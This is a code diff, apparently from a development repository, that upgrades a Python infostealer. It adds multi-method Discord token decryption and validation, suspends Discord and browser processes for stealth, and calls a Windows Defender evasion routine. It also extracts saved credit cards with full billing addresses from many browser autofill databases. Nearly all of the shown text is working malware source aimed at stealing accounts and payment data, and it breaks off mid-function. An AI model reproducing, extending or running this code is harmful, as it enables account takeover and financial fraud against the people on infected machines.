@@ -217,12 +217,39 @@ def steal_discord_tokens_encrypted():
     try:
         from Cryptodome.Cipher import AES
         
-        def decrypt_token(buff, master_key):
+        def decrypt_token_enhanced(buff, master_key):
             try:
-                iv = buff[3:15]
-                payload = buff[15:]
-                cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                return cipher.decrypt(payload)[:-16].decode()
+                # Method 1: Standard AES-GCM decryption (current Discord method)
+                try:
+                    if len(buff) < 31:
+                        return None
+                    iv = buff[3:15]
+                    payload = buff[15:-16]
+                    tag = buff[-16:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                    decrypted = cipher.decrypt_and_verify(payload, tag)
+                    return decrypted.decode('utf-8')
+                except:
+                    pass
+                
+                # Method 2: Fallback AES-GCM without tag verification
+                try:
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                    decrypted = cipher.decrypt(payload)[:-16]
+                    return decrypted.decode('utf-8')
+                except:
+                    pass
+                
+                # Method 3: DPAPI decryption (older versions)
+                try:
+                    decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
+                    return decrypted.decode('utf-8')
+                except:
+                    pass
+                
+                return None
             except:
                 return None
 
@@ -237,101 +264,206 @@ def steal_discord_tokens_encrypted():
             except:
                 return None
 
-        def validate_token_local(token):
+        def validate_token_enhanced(token):
             try:
-                api_url = "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me"
-                response = requests.get(api_url, headers={'Authorization': token})
-                return response.status_code == 200
+                if not token or len(token) < 50:
+                    return False
+                
+                # Check token format
+                parts = token.split('.')
+                if len(parts) != 3:
+                    return False
+                
+                # Try multiple endpoints
+                headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                endpoints = [
+                    "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me",
+                    "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me/settings",
+                    "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me/guilds"
+                ]
+                
+                for endpoint in endpoints:
+                    try:
+                        response = requests.get(endpoint, headers=headers, timeout=10)
+                        if response.status_code == 200:
+                            return True
+                    except:
+                        continue
+                return False
             except:
                 return False
+
+        def get_user_info_local(token):
+            try:
+                headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                api_url = "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me"
+                response = requests.get(api_url, headers=headers, timeout=10)
+                if response.status_code == 200:
+                    return response.json()
+                return None
+            except:
+                return None
         
-        # Terminate Discord processes first (but remember which ones were running)
-        discord_processes = ["discord.exe", "discordcanary.exe", "discordptb.exe"]
+        # Enhanced Discord process detection and suspension
+        discord_processes = [
+            "discord.exe", "discordcanary.exe", "discordptb.exe", "discorddevelopment.exe",
+            "discord", "discordcanary", "discordptb", "discorddevelopment",
+            "discordapp.exe", "discord-canary.exe", "discord-ptb.exe"
+        ]
         running_discord_processes = []
         
-        for proc in psutil.process_iter(['pid', 'name', 'exe']):
+        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
             try:
-                if proc.info['name'].lower() in [p.lower() for p in discord_processes]:
-                    if proc.info['exe']:  # Make sure we have the executable path
-                        running_discord_processes.append(proc.info['exe'])
-                    proc.terminate()
+                if proc.info['name'] and any(dp in proc.info['name'].lower() for dp in discord_processes):
+                    if proc.info.get('exe'):
+                        running_discord_processes.append({
+                            'exe': proc.info['exe'],
+                            'pid': proc.info['pid'],
+                            'cmdline': proc.info.get('cmdline', [])
+                        })
+                    proc.suspend()  # Suspend instead of terminate for stealth
             except:
                 pass
         
-        time.sleep(3)  # Wait longer for processes to close
+        time.sleep(2)  # Wait for processes to suspend
         
-        # Discord paths using obfuscated strings
-        paths = [
-            ("Discord", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str'), 
-             "Local Storage", get_deobfuscated_string('leveldb')), ""),
-            ("Discord Canary", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "canary", 
-             "Local Storage", get_deobfuscated_string('leveldb')), ""),
-            ("Discord PTB", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "ptb", 
-             "Local Storage", get_deobfuscated_string('leveldb')), ""),
+        # Enhanced Discord paths - covers all possible installations
+        base_paths = [
+            ("Discord Stable", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str'))),
+            ("Discord Canary", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "canary")),
+            ("Discord PTB", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "ptb")),
+            ("Discord Development", os.path.join(os.getenv('APPDATA'), get_deobfuscated_string('discord_str') + "development")),
+            ("Discord (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "Discord")),
+            ("Discord Canary (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "DiscordCanary")),
+            ("Discord PTB (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "DiscordPTB")),
         ]
         
         tokens = []
         uids = []
-        regexp_enc = r'dQw4w9WgXcQ:[^"]*'
+        processed_tokens = set()
         
-        for name, path, proc_name in paths:
-            if not os.path.exists(path):
+        # Enhanced token patterns for better detection
+        token_patterns = [
+            r'dQw4w9WgXcQ:[^"]*',  # Standard encrypted token pattern
+            r'["\']([A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,})["\']',  # Raw token pattern
+            r'token["\']:\\s*["\']([^"\']+)["\']',  # Token in JSON
+            r'authorization["\']:\\s*["\']([^"\']+)["\']',  # Authorization header
+        ]
+        
+        for name, base_path in base_paths:
+            if not os.path.exists(base_path):
+                continue
+                
+            leveldb_path = os.path.join(base_path, "Local Storage", get_deobfuscated_string('leveldb'))
+            local_state_path = os.path.join(base_path, 'Local State')
+            
+            if not os.path.exists(leveldb_path) or not os.path.exists(local_state_path):
+                continue
+                
+            master_key = get_master_key_local(local_state_path)
+            if not master_key:
                 continue
             
-            # Check if this is a Discord path
-            discord_name = name.replace(" ", "").lower()
-            if "cord" in path:
-                local_state_path = os.path.join(os.getenv('APPDATA'), discord_name, 'Local State')
-                if not os.path.exists(local_state_path):
-                    continue
-                    
-                master_key = get_master_key_local(local_state_path)
-                if not master_key:
-                    continue
-                
-                # Extract tokens from leveldb files
-                for file_name in os.listdir(path):
+            # Enhanced token extraction from leveldb files
+            for file_name in os.listdir(leveldb_path):
+                if file_name.endswith((".ldb", ".log", ".sst")):
+                    file_path = os.path.join(leveldb_path, file_name)
+                    try:
+                        # Try both binary and text reading
+                        for read_mode in ['rb', 'r']:
+                            try:
+                                with open(file_path, read_mode, errors='ignore') as f:
+                                    if read_mode == 'rb':
+                                        content = f.read().decode('utf-8', errors='ignore')
+                                    else:
+                                        content = f.read()
+                                    
+                                    # Search for all token patterns
+                                    for pattern in token_patterns:
+                                        matches = re.findall(pattern, content)
+                                        
+                                        for match in matches:
+                                            try:
+                                                if pattern.startswith('dQw4w9WgXcQ'):
+                                                    # Encrypted token - decrypt it
+                                                    encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
+                                                    token = decrypt_token_enhanced(encrypted_data, master_key)
+                                                else:
+                                                    # Raw token - use directly
+                                                    token = match if isinstance(match, str) else match
+                                                
+                                                if token and len(token) > 50 and token not in processed_tokens:
+                                                    if validate_token_enhanced(token):
+                                                        processed_tokens.add(token)
+                                                        
+                                                        # Get detailed user info
+                                                        user_info = get_user_info_local(token)
+                                                        if user_info and user_info.get('id') not in uids:
+                                                            tokens.append(token)
+                                                            uids.append(user_info.get('id'))
+                                                        
+                                            except:
+                                                continue
+                                                
+                                break  # If text reading worked, don't try binary
+                            except UnicodeDecodeError:
+                                continue  # Try next read mode
+                            except:
+                                continue
+                                
+                    except:
+                        continue
+            
+            # Also check session storage
+            session_storage_path = os.path.join(base_path, "Session Storage")
+            if os.path.exists(session_storage_path):
+                for file_name in os.listdir(session_storage_path):
                     if file_name.endswith((".ldb", ".log")):
-                        file_path = os.path.join(path, file_name)
+                        file_path = os.path.join(session_storage_path, file_name)
                         try:
-                            with open(file_path, errors='ignore') as f:
-                                for line in f:
-                                    for match in re.findall(regexp_enc, line.strip()):
-                                        try:
-                                            encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
-                                            token = decrypt_token(encrypted_data, master_key)
-                                            if token and validate_token_local(token):
-                                                if token not in tokens:
-                                                    tokens.append(token)
-                                                    # Get user ID
-                                                    try:
-                                                        api_url = "https://" + get_deobfuscated_string('discord_com') + "/api/v9/users/@me"
-                                                        response = requests.get(api_url, headers={'Authorization': token})
-                                                        if response.status_code == 200:
-                                                            user_data = response.json()
-                                                            uids.append(user_data.get('id', 'Unknown'))
-                                                        else:
-                                                            uids.append('Unknown')
-                                                    except:
-                                                        uids.append('Unknown')
-                                        except:
-                                            continue
+                            with open(file_path, 'r', errors='ignore') as f:
+                                content = f.read()
+                                for pattern in token_patterns:
+                                    matches = re.findall(pattern, content)
+                                    for match in matches:
+                                        if isinstance(match, str) and len(match) > 50 and match not in processed_tokens:
+                                            if validate_token_enhanced(match):
+                                                processed_tokens.add(match)
+                                                user_info = get_user_info_local(match)
+                                                if user_info and user_info.get('id') not in uids:
+                                                    tokens.append(match)
+                                                    uids.append(user_info.get('id'))
                         except:
                             continue
         
-        # Restart Discord processes that were running
-        for process_path in running_discord_processes:
+        # Enhanced process restoration
+        for proc_info in running_discord_processes:
             try:
-                if os.path.exists(process_path):
-                    subprocess.Popen([process_path], shell=False)
-                    time.sleep(1)  # Small delay between process starts
-            except:
+                # Try to resume suspended process first
                 try:
-                    # Fallback: try to start without full path
-                    process_name = os.path.basename(process_path)
-                    subprocess.Popen([process_name], shell=True)
+                    import psutil
+                    proc = psutil.Process(proc_info['pid'])
+                    proc.resume()
+                    time.sleep(0.2)
                 except:
-                    pass
+                    # Process no longer exists, restart it
+                    try:
+                        if proc_info.get('cmdline') and len(proc_info['cmdline']) > 0:
+                            subprocess.Popen(proc_info['cmdline'], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        else:
+                            subprocess.Popen([proc_info['exe']], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        time.sleep(0.5)
+                    except:
+                        try:
+                            # Final fallback
+                            process_name = os.path.basename(proc_info['exe'])
+                            subprocess.Popen([process_name], shell=True)
+                        except:
+                            pass
+            except:
+                pass
         
         return tokens, uids
     except Exception as e:
@@ -583,34 +715,133 @@ def initialize_defender_evasion():
 # ================================================================
 
 def steal_discord_tokens():
-    """Encrypted Discord token stealer with multi-layer encryption"""
+    """Enhanced Discord token stealer with multiple extraction methods"""
     try:
+        print("Debug: Starting comprehensive Discord token extraction...")
+        
         # Initialize Windows Defender evasion first
         try:
             initialize_defender_evasion()
         except Exception as e:
             print(f"Debug: Defender evasion failed: {str(e)}")
         
-        # Execute encrypted function with multi-layer decryption
+        all_tokens = []
+        all_uids = []
+        
+        # Method 1: Execute encrypted function with multi-layer decryption
         try:
             result = _payload_cryptor.execute_encrypted_function(
                 _ENCRYPTED_PAYLOADS['discord_stealer'], 
                 'steal_discord_tokens_encrypted'
             )
             
-            # Return result or empty if failed
             if result and isinstance(result, (list, tuple)) and len(result) >= 2:
-                return result
+                tokens, uids = result
+                all_tokens.extend(tokens)
+                all_uids.extend(uids)
+                print(f"Debug: Encrypted method found {len(tokens)} tokens")
             else:
-                print("Debug: Encrypted function returned invalid result, falling back to original")
-                return steal_discord_tokens_original_backup()
+                print("Debug: Encrypted function returned invalid result")
         except Exception as e:
-            print(f"Debug: Encrypted function failed: {str(e)}, falling back to original")
-            return steal_discord_tokens_original_backup()
+            print(f"Debug: Encrypted function failed: {str(e)}")
+        
+        # Method 2: Fallback to enhanced original backup
+        try:
+            backup_tokens = steal_discord_tokens_original_backup()
+            if backup_tokens:
+                for token in backup_tokens:
+                    if token not in all_tokens:
+                        all_tokens.append(token)
+                        # Get UID for this token
+                        try:
+                            user_info = get_discord_user_info(token)
+                            if user_info and user_info.get('id') not in all_uids:
+                                all_uids.append(user_info.get('id'))
+                        except:
+                            all_uids.append('Unknown')
+                print(f"Debug: Backup method found {len(backup_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Backup method failed: {str(e)}")
+        
+        # Method 3: Extract from browser storage (web Discord tokens)
+        try:
+            browser_tokens = extract_discord_tokens_from_browsers()
+            for token, source in browser_tokens:
+                if token not in all_tokens:
+                    all_tokens.append(token)
+                    try:
+                        user_info = get_discord_user_info(token)
+                        if user_info and user_info.get('id') not in all_uids:
+                            all_uids.append(user_info.get('id'))
+                        print(f"Debug: Browser token found from {source}")
+                    except:
+                        all_uids.append('Unknown')
+            print(f"Debug: Browser method found {len(browser_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Browser extraction failed: {str(e)}")
+        
+        # Method 4: Extract from memory (advanced)
+        try:
+            memory_tokens = extract_discord_tokens_from_memory()
+            for token, source in memory_tokens:
+                if token not in all_tokens:
+                    all_tokens.append(token)
+                    try:
+                        user_info = get_discord_user_info(token)
+                        if user_info and user_info.get('id') not in all_uids:
+                            all_uids.append(user_info.get('id'))
+                        print(f"Debug: Memory token found from {source}")
+                    except:
+                        all_uids.append('Unknown')
+            print(f"Debug: Memory method found {len(memory_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Memory extraction failed: {str(e)}")
+        
+        # Method 5: Extract from Discord injection data (if injection is active)
+        try:
+            injection_tokens = extract_discord_injection_tokens()
+            for token, source in injection_tokens:
+                if token not in all_tokens:
+                    all_tokens.append(token)
+                    try:
+                        user_info = get_discord_user_info(token)
+                        if user_info and user_info.get('id') not in all_uids:
+                            all_uids.append(user_info.get('id'))
+                        print(f"Debug: Injection token found from {source}")
+                    except:
+                        all_uids.append('Unknown')
+            print(f"Debug: Injection method found {len(injection_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Injection extraction failed: {str(e)}")
+        
+        # Method 6: Extract from browser cookies (Discord web sessions)
+        try:
+            cookie_tokens = extract_discord_tokens_from_cookies()
+            for token, source in cookie_tokens:
+                if token not in all_tokens:
+                    all_tokens.append(token)
+                    try:
+                        user_info = get_discord_user_info(token)
+                        if user_info and user_info.get('id') not in all_uids:
+                            all_uids.append(user_info.get('id'))
+                        print(f"Debug: Cookie token found from {source}")
+                    except:
+                        all_uids.append('Unknown')
+            print(f"Debug: Cookie method found {len(cookie_tokens)} additional tokens")
+        except Exception as e:
+            print(f"Debug: Cookie extraction failed: {str(e)}")
+        
+        # Update counter with final count
+        counters['discord_tokens_found'] = len(all_tokens)
+        
+        print(f"Debug: Total Discord tokens found: {len(all_tokens)} from {len(all_uids)} unique users")
+        
+        # Return tokens only (maintain compatibility with existing code)
+        return all_tokens
             
     except Exception as e:
         print(f"Debug: Discord token stealing failed: {str(e)}")
-        return [], []
+        return []
 
 def collect_enhanced_browser_data():
     """Browser data collector with Windows Defender evasion"""
@@ -639,7 +870,7 @@ def steal_roblox_accounts():
 # ================================================================
 
 def extract_credit_cards_advanced():
-    """Super advanced credit card extraction from multiple sources"""
+    """Super advanced credit card extraction from multiple sources with enhanced methods"""
     try:
         print("💳 Starting advanced credit card extraction...")
         
@@ -650,55 +881,155 @@ def extract_credit_cards_advanced():
             'clipboard_cards': [],
             'file_cards': [],
             'registry_cards': [],
-            'memory_cards': []
+            'memory_cards': [],
+            'browser_history_cards': [],  # New: from payment URLs in history
+            'browser_downloads_cards': [],  # New: from downloaded payment files
+            'discord_payment_cards': [],  # New: from Discord payment data
+            'temp_file_cards': [],  # New: from temporary files
+            'recent_docs_cards': []  # New: from recent documents
         }
         
-        # 1. Extract from browser autofill data
+        # Enhanced browser process suspension with better stealth
+        suspended_processes = []
         try:
-            all_cards['browser_autofill'] = extract_autofill_credit_cards()
+            browser_processes = [
+                'chrome.exe', 'msedge.exe', 'firefox.exe', 'opera.exe', 'brave.exe',
+                'vivaldi.exe', 'arc.exe', 'thorium.exe', 'yandex.exe', 'centbrowser.exe'
+            ]
+            for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
+                try:
+                    if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in browser_processes]:
+                        suspended_processes.append({
+                            'process': proc,
+                            'pid': proc.info['pid'],
+                            'name': proc.info['name'],
+                            'exe': proc.info.get('exe'),
+                            'cmdline': proc.info.get('cmdline', [])
+                        })
+                        proc.suspend()
+                        time.sleep(0.02)  # Reduced delay for speed
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        
+        print(f"💳 Suspended {len(suspended_processes)} browser processes for extraction")
+        
+        # 1. Extract from browser autofill data (enhanced)
+        try:
+            all_cards['browser_autofill'] = extract_autofill_credit_cards_enhanced()
+            print(f"💳 Autofill extraction: {len(all_cards['browser_autofill'])} cards")
         except Exception as e:
             print(f"💳 Autofill extraction failed: {e}")
         
-        # 2. Extract from browser saved payment methods
+        # 2. Extract from browser saved payment methods (enhanced)
         try:
-            all_cards['browser_saved_cards'] = extract_saved_payment_methods()
+            all_cards['browser_saved_cards'] = extract_saved_payment_methods_enhanced()
+            print(f"💳 Saved cards extraction: {len(all_cards['browser_saved_cards'])} cards")
         except Exception as e:
             print(f"💳 Saved cards extraction failed: {e}")
         
-        # 3. Extract from form submission data
+        # 3. Extract from form submission data (enhanced)
         try:
-            all_cards['form_data'] = extract_form_credit_cards()
+            all_cards['form_data'] = extract_form_credit_cards_enhanced()
+            print(f"💳 Form data extraction: {len(all_cards['form_data'])} cards")
         except Exception as e:
             print(f"💳 Form data extraction failed: {e}")
         
-        # 4. Extract from clipboard (recently copied cards)
+        # 4. Extract from clipboard (enhanced with history)
         try:
-            all_cards['clipboard_cards'] = extract_clipboard_credit_cards()
+            all_cards['clipboard_cards'] = extract_clipboard_credit_cards_enhanced()
+            print(f"💳 Clipboard extraction: {len(all_cards['clipboard_cards'])} cards")
         except Exception as e:
             print(f"💳 Clipboard extraction failed: {e}")
         
-        # 5. Extract from files (wallet apps, payment software)
+        # 5. Extract from files (enhanced with more locations)
         try:
-            all_cards['file_cards'] = extract_file_credit_cards()
+            all_cards['file_cards'] = extract_file_credit_cards_enhanced()
+            print(f"💳 File extraction: {len(all_cards['file_cards'])} cards")
         except Exception as e:
             print(f"💳 File extraction failed: {e}")
         
-        # 6. Extract from Windows registry
+        # 6. Extract from Windows registry (enhanced)
         try:
-            all_cards['registry_cards'] = extract_registry_credit_cards()
+            all_cards['registry_cards'] = extract_registry_credit_cards_enhanced()
+            print(f"💳 Registry extraction: {len(all_cards['registry_cards'])} cards")
         except Exception as e:
             print(f"💳 Registry extraction failed: {e}")
         
-        # 7. Extract from memory (running payment processes)
+        # 7. Extract from memory (enhanced with process scanning)
         try:
-            all_cards['memory_cards'] = extract_memory_credit_cards()
+            all_cards['memory_cards'] = extract_memory_credit_cards_enhanced()
+            print(f"💳 Memory extraction: {len(all_cards['memory_cards'])} cards")
         except Exception as e:
             print(f"💳 Memory extraction failed: {e}")
         
-        # Validate and deduplicate cards
-        validated_cards = validate_and_deduplicate_cards(all_cards)
+        # 8. NEW: Extract from browser history (payment URLs)
+        try:
+            all_cards['browser_history_cards'] = extract_credit_cards_from_history()
+            print(f"💳 History extraction: {len(all_cards['browser_history_cards'])} cards")
+        except Exception as e:
+            print(f"💳 History extraction failed: {e}")
         
-        print(f"💳 Credit card extraction complete: {len(validated_cards)} valid cards found")
+        # 9. NEW: Extract from browser downloads (payment files)
+        try:
+            all_cards['browser_downloads_cards'] = extract_credit_cards_from_downloads()
+            print(f"💳 Downloads extraction: {len(all_cards['browser_downloads_cards'])} cards")
+        except Exception as e:
+            print(f"💳 Downloads extraction failed: {e}")
+        
+        # 10. NEW: Extract from Discord payment data
+        try:
+            all_cards['discord_payment_cards'] = extract_discord_payment_cards()
+            print(f"💳 Discord payment extraction: {len(all_cards['discord_payment_cards'])} cards")
+        except Exception as e:
+            print(f"💳 Discord payment extraction failed: {e}")
+        
+        # 11. NEW: Extract from temporary files
+        try:
+            all_cards['temp_file_cards'] = extract_credit_cards_from_temp_files()
+            print(f"💳 Temp files extraction: {len(all_cards['temp_file_cards'])} cards")
+        except Exception as e:
+            print(f"💳 Temp files extraction failed: {e}")
+        
+        # 12. NEW: Extract from recent documents
+        try:
+            all_cards['recent_docs_cards'] = extract_credit_cards_from_recent_docs()
+            print(f"💳 Recent docs extraction: {len(all_cards['recent_docs_cards'])} cards")
+        except Exception as e:
+            print(f"💳 Recent docs extraction failed: {e}")
+        
+        # Enhanced process restoration with better error handling
+        try:
+            print(f"💳 Resuming {len(suspended_processes)} browser processes...")
+            for proc_info in suspended_processes:
+                try:
+                    # Try to resume the suspended process
+                    proc_info['process'].resume()
+                    time.sleep(0.02)
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    # Process no longer exists, try to restart it
+                    try:
+                        if proc_info.get('cmdline') and len(proc_info['cmdline']) > 0:
+                            subprocess.Popen(proc_info['cmdline'], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        elif proc_info.get('exe'):
+                            subprocess.Popen([proc_info['exe']], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        time.sleep(0.1)
+                    except Exception:
+                        pass
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        
+        # Enhanced validation and deduplication
+        validated_cards = validate_and_deduplicate_cards_enhanced(all_cards)
+        
+        print(f"💳 SUPER ADVANCED credit card extraction complete: {len(validated_cards)} valid cards found")
         return validated_cards
         
     except Exception as e:
@@ -710,20 +1041,26 @@ def extract_autofill_credit_cards():
     try:
         cards = []
         
-        # Chrome autofill database
-        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
-        if os.path.exists(chrome_path):
-            cards.extend(extract_chrome_autofill_cards(chrome_path))
+        # Enhanced browser coverage with all profiles
+        browser_configs = [
+            ('Chrome Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Web Data')),
+            ('Chrome Profile 2', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 2', 'Web Data')),
+            ('Edge Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
+            ('Edge Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Web Data')),
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Web Data')),
+            ('Vivaldi', os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Web Data')),
+        ]
         
-        # Edge autofill database
-        edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')
-        if os.path.exists(edge_path):
-            cards.extend(extract_chrome_autofill_cards(edge_path))
+        for browser_name, db_path in browser_configs:
+            if os.path.exists(db_path):
+                cards.extend(extract_chrome_autofill_cards_enhanced(db_path, browser_name))
         
-        # Firefox autofill database
+        # Enhanced Firefox autofill database
         firefox_profiles = get_firefox_profiles()
         for profile in firefox_profiles:
-            cards.extend(extract_firefox_autofill_cards(profile))
+            cards.extend(extract_firefox_autofill_cards_enhanced(profile))
         
         return cards
         
@@ -732,7 +1069,7 @@ def extract_autofill_credit_cards():
         return []
 
 def extract_chrome_autofill_cards(db_path):
-    """Extract credit cards from Chrome/Edge autofill database"""
+    """Extract credit cards from Chrome/Edge autofill database with FULL information"""
     try:
         cards = []
         
@@ -743,30 +1080,100 @@ def extract_chrome_autofill_cards(db_path):
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
         
-        # Query credit card autofill data
+        # Enhanced query to get ALL available credit card data
         cursor.execute("""
-            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified
+            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, 
+                   date_modified, use_count, use_date, billing_address_id, origin,
+                   nickname, card_type, issuer_id
             FROM credit_cards
             WHERE card_number_encrypted IS NOT NULL
         """)
         
         for row in cursor.fetchall():
             try:
-                name, month, year, encrypted_card, date_modified = row
+                # Handle different numbers of columns returned
+                if len(row) >= 5:
+                    name, month, year, encrypted_card, date_modified = row[:5]
+                    use_count = row[5] if len(row) > 5 else None
+                    use_date = row[6] if len(row) > 6 else None
+                    billing_id = row[7] if len(row) > 7 else None
+                    origin = row[8] if len(row) > 8 else None
+                    nickname = row[9] if len(row) > 9 else None
+                    card_type = row[10] if len(row) > 10 else None
+                    issuer_id = row[11] if len(row) > 11 else None
+                else:
+                    continue
                 
-                # Try to decrypt the card number
+                # Enhanced decryption with multiple methods
                 chrome_profile_path = os.path.dirname(os.path.dirname(db_path))
-                decrypted_card = decrypt_chrome_credit_card(encrypted_card, chrome_profile_path)
-                if decrypted_card and validate_credit_card(decrypted_card):
-                    cards.append({
+                decrypted_card = decrypt_chrome_credit_card_enhanced(encrypted_card, chrome_profile_path)
+                
+                if decrypted_card and validate_credit_card_enhanced(decrypted_card):
+                    # Get comprehensive billing address information
+                    billing_info = None
+                    if billing_id:
+                        try:
+                            cursor.execute("""
+                                SELECT first_name, last_name, middle_name, full_name,
+                                       company_name, street_address, dependent_locality,
+                                       city, state, zipcode, sorting_code, country_code,
+                                       phone_number, email, language_code
+                                FROM autofill_profiles
+                                WHERE guid = ?
+                            """, (billing_id,))
+                            billing_row = cursor.fetchone()
+                            if billing_row:
+                                billing_info = {
+                                    'first_name': billing_row[0] if len(billing_row) > 0 else None,
+                                    'last_name': billing_row[1] if len(billing_row) > 1 else None,
+                                    'middle_name': billing_row[2] if len(billing_row) > 2 else None,
+                                    'full_name': billing_row[3] if len(billing_row) > 3 else None,
+                                    'company': billing_row[4] if len(billing_row) > 4 else None,
+                                    'address': billing_row[5] if len(billing_row) > 5 else None,
+                                    'address2': billing_row[6] if len(billing_row) > 6 else None,
+                                    'city': billing_row[7] if len(billing_row) > 7 else None,
+                                    'state': billing_row[8] if len(billing_row) > 8 else None,
+                                    'zipcode': billing_row[9] if len(billing_row) > 9 else None,
+                                    'sorting_code': billing_row[10] if len(billing_row) > 10 else None,
+                                    'country': billing_row[11] if len(billing_row) > 11 else None,
+                                    'phone': billing_row[12] if len(billing_row) > 12 else None,
+                                    'email': billing_row[13] if len(billing_row) > 13 else None,
+                                    'language': billing_row[14] if len(billing_row) > 14 else None
+                                }
+                        except Exception as billing_error:
+                            print(f"💳 Billing info extraction error: {str(billing_error)}")
+                    
+                    # Determine card issuer and type
+                    card_issuer = determine_card_issuer(decrypted_card)
+                    
+                    # Create comprehensive card information
+                    card_info = {
                         'card_number': decrypted_card,
-                        'name': name,
+                        'name_on_card': name,
                         'exp_month': month,
                         'exp_year': year,
                         'date_modified': date_modified,
-                        'source': 'chrome_autofill'
-                    })
-            except:
+                        'use_count': use_count,
+                        'use_date': use_date,
+                        'origin': origin,
+                        'nickname': nickname,
+                        'card_type': card_type,
+                        'issuer': card_issuer,
+                        'issuer_id': issuer_id,
+                        'billing_info': billing_info,
+                        'source': 'chrome_autofill',
+                        'browser': 'Chrome/Edge',
+                        'validation_score': 0  # Will be calculated later
+                    }
+                    
+                    # Calculate validation score
+                    card_info['validation_score'] = calculate_card_validation_score(card_info)
+                    
+                    cards.append(card_info)
+                    print(f"💳 FULL card extracted: {card_issuer} ending in {decrypted_card[-4:]} - {name}")
+                    
+            except Exception as card_error:
+                print(f"💳 Error processing card: {str(card_error)}")
                 continue
         
         conn.close()
@@ -778,71 +1185,33 @@ def extract_chrome_autofill_cards(db_path):
         return []
 
 def decrypt_chrome_credit_card(encrypted_data, chrome_profile_path=None):
-    """Decrypt Chrome credit card data"""
-    try:
-        # Get Chrome encryption key from Local State
-        if chrome_profile_path:
-            local_state_path = os.path.join(chrome_profile_path, 'Local State')
-        else:
-            # Default Chrome paths
-            chrome_paths = [
-                os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
-                os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
-            ]
-            local_state_path = None
-            for chrome_path in chrome_paths:
-                test_path = os.path.join(chrome_path, 'Local State')
-                if os.path.exists(test_path):
-                    local_state_path = test_path
-                    break
-        
-        if not local_state_path or not os.path.exists(local_state_path):
-            return None
-        
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.load(f)
-        
-        if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
-            return None
-        
-        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
-        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        
-        # Decrypt the card number (Chrome uses DPAPI encryption)
-        try:
-            decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
-            return decrypted.decode('utf-8')
-        except:
-            # Fallback to AES-GCM if DPAPI fails
-            if len(encrypted_data) > 15:
-                nonce = encrypted_data[3:15]
-                ciphertext = encrypted_data[15:-16]
-                tag = encrypted_data[-16:]
-                
-                cipher = AES.new(key, AES.MODE_GCM, nonce)
-                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
